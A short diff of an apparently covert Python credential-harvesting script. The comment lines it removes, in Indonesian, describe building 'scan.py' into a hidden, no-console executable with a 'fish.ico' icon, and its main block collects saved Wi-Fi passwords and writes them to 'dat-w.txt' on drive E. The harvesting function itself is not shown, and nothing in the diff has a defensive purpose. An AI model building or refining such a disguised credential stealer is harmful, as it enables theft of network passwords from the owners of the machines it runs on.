@@ -1,5 +1,3 @@
-#convert ke .exe pyinstaller --onefile --noconsole --icon="fish.ico" scan.py
-#hasil data dat-w.txt
 import subprocess
 import os
 
@@ -50,3 +48,4 @@ def save_to_file(data, drive, filename):
 if __name__ == "__main__":
     wifi_data = get_wifi_passwords()
     save_to_file(wifi_data, 'E', 'dat-w.txt')
+
